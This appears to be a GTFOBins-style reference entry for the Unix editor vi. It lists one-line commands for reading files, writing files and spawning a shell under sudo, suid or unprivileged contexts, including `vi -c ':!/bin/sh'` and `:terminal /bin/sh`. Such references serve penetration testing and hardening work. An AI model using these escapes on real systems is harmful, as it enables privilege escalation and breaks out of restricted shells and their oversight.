---
type: gtfobin
name: vi
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# vi

## file-read

```bash
vi /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
vi /path/to/output-file
iDATA
^[
w
```
_Where `^[` is the escape key._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
vi -c ':!/bin/sh' /dev/null
```
**Contexts:** sudo, suid, unprivileged

```bash
vi -c ':shell'
```
**Contexts:** sudo, suid, unprivileged

```bash
vi -c ':set shell=/bin/sh | shell'
```
**Contexts:** sudo, suid, unprivileged

```bash
vi -c :terminal /bin/sh
```
**Contexts:** sudo, suid, unprivileged
